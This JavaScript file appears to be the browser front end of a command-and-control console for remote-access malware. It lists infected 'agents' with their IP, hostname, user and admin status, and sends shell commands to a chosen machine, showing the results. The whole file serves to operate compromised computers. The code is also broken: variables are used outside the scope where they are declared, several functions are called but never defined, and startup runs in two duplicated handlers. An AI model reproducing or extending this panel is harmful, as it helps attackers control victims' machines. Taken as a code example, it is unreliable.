document.addEventListener('DOMContentLoaded', function() {
    // Initialize variables
    let currentSession = null;
    let selectedAgents = new Set();
    let commandHistory = [];
    let historyIndex = -1;
    let currentAgent = null;

    // Initialize tabs
    const tabButtons = document.querySelectorAll('.tab-button');
    const tabPanes = document.querySelectorAll('.tab-pane');
    
    tabButtons.forEach(button => {
        button.addEventListener('click', () => {
            // Get tab name from data attribute
            const tabName = button.getAttribute('data-tab');
            
            // Remove active class from all buttons and panes
            tabButtons.forEach(btn => btn.classList.remove('active'));
            tabPanes.forEach(pane => pane.classList.remove('active'));
            
            // Add active class to clicked button and corresponding pane
            button.classList.add('active');
            const targetPane = document.getElementById(`${tabName}-tab`);
            if (targetPane) {
                targetPane.classList.add('active');
            }
            
            // Refresh content if needed
            if (tabName === 'storage') {
                updateStorage();
            } else if (tabName === 'agents') {
                updateTargets();
            }
            
            console.log(`Switched to ${tabName} tab`);
        });
    });

    // Initialize command input
    const commandInput = document.getElementById('command-input');
    if (commandInput) {
        // Add enter key handler
        commandInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                sendCommand();
            }
        });

        // Add command history navigation
        commandInput.addEventListener('keydown', function(e) {
            if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (historyIndex < commandHistory.length - 1) {
                    historyIndex++;
                    this.value = commandHistory[historyIndex];
                }
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (historyIndex > -1) {
                    historyIndex--;
                    this.value = historyIndex === -1 ? '' : commandHistory[historyIndex];
                }
            }
        });
    }

    // Start periodic updates
    updateTargets();
    setInterval(updateTargets, 7000);

    // Initialize storage
    updateStorage();

    // Start agent menu updates
    updateAgentMenu();
    setInterval(updateAgentMenu, 7000);
});

// Add these helper functions
function updateSelectedCount() {
    const countElement = document.querySelector('.selected-count');
    if (countElement) {
        countElement.textContent = `${selectedAgents.size} agents selected`;
    }
}

function selectAllAgents() {
    const checkboxes = document.querySelectorAll('.agent-checkbox input[type="checkbox"]');
    checkboxes.forEach(checkbox => {
        checkbox.checked = true;
        selectedAgents.add(parseInt(checkbox.id.replace('agent-', '')));
    });
    updateSelectedCount();
}

function clearSelection() {
    const checkboxes = document.querySelectorAll('.agent-checkbox input[type="checkbox"]');
    checkboxes.forEach(checkbox => {
        checkbox.checked = false;
    });
    selectedAgents.clear();
    updateSelectedCount();
}

function updateAgentMenu() {
    const menuContainer = document.querySelector('.agent-menu-scroll');
    if (!menuContainer) return;

    fetch('/api/targets')
        .then(response => response.json())
        .then(agents => {
            menuContainer.innerHTML = agents.map(agent => `
                <div class="agent-menu-item ${currentAgent === agent.id ? 'active' : ''}" 
                     data-agent-id="${agent.id}">
                    <span class="status-dot"></span>
                    <span class="agent-alias">${agent.alias || `Agent_${agent.id}`}</span>
                    <span class="agent-id">#${agent.id}</span>
                </div>
            `).join('');

            // Add click handlers
            document.querySelectorAll('.agent-menu-item').forEach(item => {
                item.addEventListener('click', () => {
                    const agentId = parseInt(item.dataset.agentId);
                    switchToAgent(agentId);
                });
            });
        });
}

function switchToAgent(agentId) {
    currentAgent = agentId;
    
    // Update menu item active state
    document.querySelectorAll('.agent-menu-item').forEach(item => {
        item.classList.toggle('active', parseInt(item.dataset.agentId) === agentId);
    });
    
    // Update prompt
    const agent = Bot.botList[agentId];
    if (agent) {
        document.getElementById('current-agent').textContent = agent.alias || `agent_${agentId}`;
    }
    
    // Clear output
    document.getElementById('output').innerHTML = '';
    appendToOutput(`<div class="command-entry">Switched to agent ${agentId}</div>`);
}

// Update the sendCommand function
function sendCommand() {
    if (!currentAgent) {
        appendToOutput(`<div class="error-output">No agent selected</div>`);
        return;
    }
    
    const commandInput = document.getElementById('command-input');
    const command = commandInput.value.trim();
    if (!command) return;
    
    // Clear input and add command to output
    commandInput.value = '';
    appendToOutput(`<div class="command-entry">
        <span class="prompt">$</span>
        <span class="command">${escapeHtml(command)}</span>
    </div>`);
    
    // Show loading state
    setLoading(true);
    
    // Send command to selected agent
    fetch('/api/send_command', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            session_id: currentAgent,
            command: command
        })
    })
    .then(response => {
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        return response.json();
    })
    .then(data => {
        if (data.error) {
            throw new Error(data.error);
        }
        appendToOutput(`<div class="command-output">${formatOutput(data.output)}</div>`);
    })
    .catch(error => {
        appendToOutput(`<div class="error-output">Error: ${escapeHtml(error.message)}</div>`);
    })
    .finally(() => {
        setLoading(false);
        scrollOutputToBottom();
    });
}

// Add these functions for agent management
function updateTargets() {
    fetch('/api/targets')
        .then(response => response.json())
        .then(targets => {
            const targetsList = document.getElementById('targets-list');
            if (!targetsList) return;

            if (targets.length === 0) {
                targetsList.innerHTML = `
                    <div class="no-targets">
                        <span class="material-icons">devices_off</span>
                        <p>No agents connected</p>
                    </div>`;
                return;
            }

            targetsList.innerHTML = targets.map(target => `
                <div class="target-item" data-id="${target.id}">
                    <div class="agent-checkbox">
                        <input type="checkbox" id="agent-${target.id}" 
                               ${selectedAgents.has(target.id) ? 'checked' : ''}>
                    </div>
                    <div class="agent-info">
                        <div class="agent-details">
                            <div class="agent-header">
                                <div class="status-badge ${isAgentActive(target.last_seen) ? 'online' : 'offline'}"></div>
                                <div class="agent-name">${target.alias || `Agent_${target.id}`}</div>
                                <div class="os-type">${target.os_type}</div>
                            </div>
                            <div class="agent-meta">
                                <span>
                                    <span class="material-icons">router</span>
                                    ${target.ip}
                                </span>
                                <span>
                                    <span class="material-icons">schedule</span>
                                    ${getTimeAgo(new Date(target.last_seen))}
                                </span>
                            </div>
                            <div class="agent-system">
                                <span>
                                    <span class="material-icons">computer</span>
                                    ${target.hostname}
                                </span>
                                <span>
                                    <span class="material-icons">person</span>
                                    ${target.username}
                                    ${target.is_admin ? '<span class="material-icons" title="Admin">admin_panel_settings</span>' : ''}
                                </span>
                            </div>
                        </div>
                    </div>
                </div>
            `).join('');

            // Add click handlers for agent selection
            document.querySelectorAll('.agent-checkbox input[type="checkbox"]').forEach(checkbox => {
                checkbox.addEventListener('change', () => {
                    const agentId = parseInt(checkbox.id.replace('agent-', ''));
                    if (checkbox.checked) {
                        selectedAgents.add(agentId);
                    } else {
                        selectedAgents.delete(agentId);
                    }
                    updateSelectedCount();
                    updateAgentMenu();
                });
            });

            // Update agent menu in command center
            updateAgentMenu();
        })
        .catch(error => {
            console.error('Error fetching targets:', error);
        });
}

function isAgentActive(lastSeen) {
    const lastSeenDate = new Date(lastSeen);
    const now = new Date();
    // Consider agent active if last seen within last 30 seconds
    return (now - lastSeenDate) < 30000;
}

function getTimeAgo(date) {
    const now = new Date();
    const seconds = Math.floor((now - date) / 1000);

    if (seconds < 60) return 'just now';
    if (seconds < 120) return '1 minute ago';
    if (seconds < 3600) return Math.floor(seconds / 60) + ' minutes ago';
    if (seconds < 7200) return '1 hour ago';
    if (seconds < 86400) return Math.floor(seconds / 3600) + ' hours ago';
    return date.toLocaleDateString();
}

// Initialize when document loads
document.addEventListener('DOMContentLoaded', function() {
    // Start periodic updates
    updateTargets();
    setInterval(updateTargets, 7000);

    // Initialize other components
    initializeTabs();
    initializeCommandInput();
    updateStorage();
}); 